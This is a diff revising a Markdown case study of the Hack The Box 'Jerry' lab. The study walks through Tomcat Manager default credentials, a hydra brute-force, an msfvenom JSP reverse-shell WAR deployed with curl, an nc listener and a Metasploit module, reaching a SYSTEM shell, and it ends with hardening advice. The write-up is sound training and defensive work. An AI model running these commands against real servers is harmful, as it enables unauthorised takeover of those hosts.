@@ -1,5 +1,5 @@
 ---
-title: "Jerry: Tomcat Default Credentials to SYSTEM Shell"
+title: "Jerry — Tomcat Manager Default Credentials to SYSTEM Shell"
 description: "Default Tomcat Manager credentials allow WAR deployment, producing an immediate SYSTEM shell."
 type: case-study
 platform: Hack The Box
@@ -11,39 +11,70 @@ tags:
   - tomcat
   - default-credentials
   - war-deployment
+objective: "Validate the documented default-credential path from Tomcat Manager access to OS-level control."
+tools:
+  - nmap
+  - gobuster
+  - hydra
+  - curl
+  - msfvenom
+  - netcat
+  - metasploit
+skill: "Exploitation of exposed Tomcat management interfaces and default credentials"
+outcome: "SYSTEM-level command execution via WAR deployment through the Tomcat Manager"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows Server 2012 R2 (Apache Tomcat 7.0.88) |
+| Starting position | Unauthenticated network access |
+| Objective | Validate the documented default-credential path from Tomcat Manager access to OS-level control |
+| Outcome | SYSTEM-level command execution through Tomcat Manager WAR deployment |
 
 ## Summary
 
-This Hack The Box lab demonstrated a common enterprise Java misconfiguration: an exposed Apache Tomcat Manager application with default credentials. Enumeration revealed a single HTTP service running Tomcat 7.0.88 with the Manager interface publicly accessible. Default credential testing yielded valid authentication, and a malicious WAR file was deployed through the Manager's legitimate upload mechanism, producing an immediate SYSTEM-level reverse shell. No privilege escalation was required because the Tomcat service ran as `NT AUTHORITY\SYSTEM`. All target IPs, attacker addresses, and credential material are replaced with role-based placeholders.
+Jerry is an Easy-rated Hack The Box Windows lab whose only exposed service is Apache Tomcat 7.0.88, with the Manager application reachable without IP restriction. The Manager authenticates with credentials shown in Tomcat's own sample configuration, and its legitimate WAR deployment feature executes a JSP reverse shell under the `NT AUTHORITY\SYSTEM` account that runs the service. Target addresses, credential values, and the deployed JSP filename are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Exposed Tomcat Manager → default credentials → authenticated WAR deployment → JSP reverse shell → SYSTEM command execution**
 
 ## Context and Objective
 
-The Windows lab (Windows Server 2012 R2) exposed a single service on TCP 8080: Apache Tomcat. The Tomcat Manager application was reachable without IP restriction, presenting an administrative interface for deploying Java web applications. Objective: validate the documented default-credential attack path from Tomcat Manager access to OS-level control.
+- **Target:** Windows Server 2012 R2 running Apache Tomcat 7.0.88 — an older release in the 7.x branch.
+- **Exposed service:** HTTP on TCP 8080, exposing the Manager and Host Manager applications.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** validate the documented default-credential attack path from Tomcat Manager access to OS-level control.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Port scanning
+### 1. Service Enumeration
 
-Observation: a full TCP scan returned one open port running Apache Tomcat 7.0.88, an end-of-life release.
+Observation: a full TCP scan returns a single open service.
 
 ```bash
-nmap -sC -sV -p- --min-rate 5000 -oN <SCAN_OUTPUT> <TARGET>
+nmap -sC -sV -p- --min-rate 5000 -oA <SCAN_OUT_PREFIX> <TARGET_IP>
 ```
 
 ```text
 PORT     STATE SERVICE VERSION
 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
 ```
 
-Technical significance: Tomcat 7.0.88 reached end-of-life in 2021 and does not receive security patches. A single exposed management interface on an older version significantly narrows the attack surface.
+Significance: the host presents one attack surface, and the version banner identifies an older Tomcat release.
 
-### Web enumeration and Manager discovery
+Result: one exposed HTTP service running Apache Tomcat 7.0.88 is identified.
 
-Observation: browsing to the target displayed the default Tomcat landing page, and directory enumeration identified the Manager application at `/manager/html`.
+### 2. Web Enumeration and Manager Discovery
+
+Observation: directory enumeration identifies the built-in management interfaces.
 
 ```bash
-gobuster dir -u http://<TARGET>:8080 \
+gobuster dir -u http://<TARGET_IP>:8080 \
   -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt \
   -t 40 -o gobuster.out
 ```
@@ -54,58 +85,60 @@ gobuster dir -u http://<TARGET>:8080 \
 /examples/
 ```
 
-Action: requested `/manager/html`, which triggered a Basic Authentication prompt. Cancelling the prompt returned a Tomcat error page containing sample configuration XML with example credentials.
+Significance: the Tomcat Manager provides authenticated users with the ability to deploy, start, stop, and undeploy web applications, so access to it is functionally equivalent to code execution on the host. Requesting `/manager/html` triggers a Basic Authentication prompt.
 
-Technical significance: the Tomcat Manager application provides authenticated users with the ability to deploy, start, stop, and undeploy web applications. Access to the Manager is functionally equivalent to arbitrary code execution on the host.
+Result: the Manager application is reachable and requires authentication; the Host Manager and default examples are also exposed.
 
-### Credential discovery and validation
+### 3. Credential Discovery and Validation
 
-Observation: the error page at `/manager/html` included Tomcat's sample `tomcat-users.xml` snippet showing example credentials.
+Observation: cancelling the Basic Authentication prompt returns a Tomcat error page that includes a sample `tomcat-users.xml` snippet with example credentials.
 
 ```xml
 <role rolename="manager-gui"/>
 <user username="tomcat" password="<DEFAULT_PASSWORD>" roles="manager-gui"/>
 ```
 
-Action: tested the documented example credentials against the Manager interface.
+Action: the documented example credential pattern was tested against the Manager interface and then confirmed directly.
 
 ```bash
 hydra -L /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
       -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
-      -f -s 8080 <TARGET> http-get /manager/html
+      -f -s 8080 <TARGET_IP> http-get /manager/html
 ```
 
 ```text
-[8080][http-get] host: <TARGET>   login: <TOMCAT_USER>   password: <TOMCAT_PASSWORD>
+[8080][http-get] host: <TARGET_IP>   login: <TOMCAT_USER>   password: <TOMCAT_PASSWORD>
 ```
 
 ```bash
-curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> http://<TARGET>:8080/manager/html -I
+curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> http://<TARGET_IP>:8080/manager/html -I
 ```
 
 ```text
 HTTP/1.1 200 OK
 ```
 
-Result: the Tomcat Manager authenticated successfully with documented default credentials. The notes confirm this was the valid credential pair for the Manager interface.
+Significance: the sample credentials in Tomcat's documentation are reusable defaults; when an administrator follows the example verbatim, the Manager grants authenticated deployment capability to anyone who reads that page.
 
-### WAR file deployment
+Result: a default credential pair is recovered and subsequently validated through the Tomcat Manager, which returns HTTP 200.
 
-Observation: Tomcat Manager's text-based deploy API accepts WAR uploads at arbitrary context paths, providing authenticated code execution.
+### 4. WAR Deployment to a SYSTEM Shell
 
-Action: generated a Java JSP reverse shell WAR file, uploaded it through the Manager API, and triggered execution by requesting the embedded JSP.
+Observation: the Manager's `/manager/text/deploy` API accepts a WAR upload at an arbitrary context path, providing authenticated code execution.
+
+Action: a JSP reverse-shell WAR was generated, uploaded through the Manager API, and triggered by requesting the embedded JSP.
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp \
-  LHOST=<ATTACKER> \
-  LPORT=9001 \
+  LHOST=<ATTACKER_HOST> \
+  LPORT=<LISTEN_PORT> \
   -f war \
   -o shell.war
 ```
 
 ```bash
 curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> \
-  http://<TARGET>:8080/manager/text/deploy?path=/shell \
+  http://<TARGET_IP>:8080/manager/text/deploy?path=/shell \
   --upload-file shell.war
 ```
 
@@ -114,36 +147,39 @@ OK - Deployed application at context path [/shell]
 ```
 
 ```bash
-nc -lvnp 9001
+nc -lvnp <LISTEN_PORT>
 ```
 
 ```bash
-curl http://<TARGET>:8080/shell/<JSP_FILENAME>.jsp
+curl http://<TARGET_IP>:8080/shell/<JSP_FILENAME>.jsp
 ```
 
+The trigger request connects back to the listener:
+
 ```text
-connect to [<ATTACKER>] from (UNKNOWN) [<TARGET>] 49193
+connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>]
 Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
 
 <TOMCAT_HOME>>whoami
 nt authority\system
 ```
 
-Result: the deployed JSP connected back to the listener as `NT AUTHORITY\SYSTEM`. No privilege escalation step was necessary — the Tomcat service ran under the SYSTEM account.
+Significance: the Manager's legitimate deployment mechanism is the code-execution primitive, and because the Tomcat service runs under the SYSTEM account, the deployed JSP inherits OS-level privileges immediately.
 
-### Alternative Metasploit path
+Result: the privileged `whoami` output confirms command execution as `NT AUTHORITY\SYSTEM`; no privilege escalation step was required.
 
-Observation: the `tomcat_mgr_upload` module in Metasploit automates the same WAR deployment technique.
+### 5. Alternative Metasploit Path
 
-```bash
+Observation: the `exploit/multi/http/tomcat_mgr_upload` module automates the same WAR deployment technique.
+
+```text
 use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS <TARGET>
+set RHOSTS <TARGET_IP>
 set RPORT 8080
 set HttpUsername <TOMCAT_USER>
 set HttpPassword <TOMCAT_PASSWORD>
-set LHOST <ATTACKER>
-set LPORT 9001
+set LHOST <ATTACKER_HOST>
+set LPORT <LISTEN_PORT>
 set PAYLOAD java/meterpreter/reverse_tcp
 run
 ```
@@ -154,24 +190,34 @@ meterpreter> getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-Technical significance: the manual and automated methods achieve identical results. The attack requires only two HTTP requests (upload and trigger) when valid credentials are available.
+Significance: the manual and automated methods reach the same execution context with the same valid credentials.
+
+Result: the module reproduces SYSTEM-level code execution on the same target.
 
 ## Challenges and Decisions
 
-No significant obstacles were encountered. The default credential was immediately valid, and the WAR deployment succeeded without error. The primary decision was to verify the attack path manually before confirming with Metasploit, ensuring both methods were validated against the same target configuration.
+No significant obstacles were encountered: the default credential was valid on the first attempt and the WAR deployment completed without error. Tomcat's sample configuration and the absence of IP restrictions on the Manager are configuration weaknesses rather than exploitable software bugs, so no troubleshooting or workaround was required.
 
 ## Outcome
 
-The evidence establishes a complete compromise chain: Tomcat Manager with default credentials provided authenticated access, the Manager's legitimate WAR upload mechanism delivered a JSP reverse shell, and the Tomcat service's SYSTEM-level execution context produced immediate OS-level control. Both flags were found on the target system. No privilege escalation was required.
+The evidence establishes SYSTEM-level command execution obtained by deploying a JSP reverse-shell WAR through the Tomcat Manager authenticated with default credentials; the privileged `whoami` output confirms the execution context, and the Metasploit module reproduces the same result. No privilege escalation was required because the Tomcat service runs as `NT AUTHORITY\SYSTEM`. The demonstrated activity is confined to a single-host Hack The Box lab, and the deployed JSP filename and credential values are omitted.
 
 ## Lessons and Recommendations
 
-- **Change all default credentials before deployment.** Tomcat ships with example credentials in `conf/tomcat-users.xml` that exist solely for documentation. These accounts must be removed or replaced with strong, unique credentials before the server is exposed to any network.
-- **Restrict Manager application access by IP.** Even with strong credentials, the Manager and Host Manager applications should not be reachable from the internet or general corporate network. Use `RemoteAddrValve` in `conf/Catalina/localhost/manager.xml` to enforce IP-based access control as defence in depth.
-- **Run Tomcat as a least-privileged service account.** The Tomcat process running as `NT AUTHORITY\SYSTEM` meant that WAR deployment immediately yielded OS-level control. A dedicated service account with minimal permissions limits the blast radius of a Tomcat compromise.
-- **Deploy a defence-in-depth strategy.** No CVE was exploited; the entire attack used Tomcat's own legitimate deployment functionality. Technical controls (credential rotation, network segmentation, least privilege) must complement patch management.
+Neither the compromise path's remediation nor any control below was validated in the lab; only the compromise itself was demonstrated. Each finding pairs the observed root cause with its demonstrated impact and a recommended action.
+
+1. **Documented default credentials left active.** Tomcat's sample `tomcat-users.xml` ships example accounts for documentation, and a deployment that keeps them grants any network peer authenticated Manager access. *Recommendation:* remove the sample accounts and set unique credentials before the server is exposed. *Detection:* alert on Manager logins that use default or sample account names. *Validation:* confirm during deployment review that no sample accounts remain in `conf/tomcat-users.xml`.
+2. **Manager reachable without IP restriction.** Authenticated access to the Manager allows WAR deployment and therefore code execution. *Recommendation:* restrict the Manager and Host Manager to trusted hosts with a `RemoteAddrValve` in `conf/Catalina/localhost/manager.xml`.
+3. **Tomcat running under `NT AUTHORITY\SYSTEM`.** Because the service held SYSTEM privileges, a deployed WAR yielded immediate OS-level control. *Recommendation:* run Tomcat under a dedicated least-privileged service account with write access limited to its own directories.
 
 ## References
 
-- Hack The Box, [Jerry](https://app.hackthebox.com/machines/Jerry) machine.
-- Apache Tomcat 7.0 documentation: Manager Application.
+- [Hack The Box — Jerry](https://app.hackthebox.com/machines/Jerry) (retired machine)
+- [Apache Tomcat 7 — Manager Application HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html) (Manager access configuration and deployment API)
+- [Apache Tomcat 7 — Valve Configuration](https://tomcat.apache.org/tomcat-7.0-doc/config/valve.html) (`RemoteAddrValve` access control)
+- [Apache Tomcat — Which Version](https://tomcat.apache.org/whichversion.html) (supported release lines and lifecycle)
+- [Metasploit — Tomcat Manager Upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [Gobuster](https://github.com/OJ/gobuster)
+- [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)
+- [curl — man page](https://curl.se/docs/manpage.html)
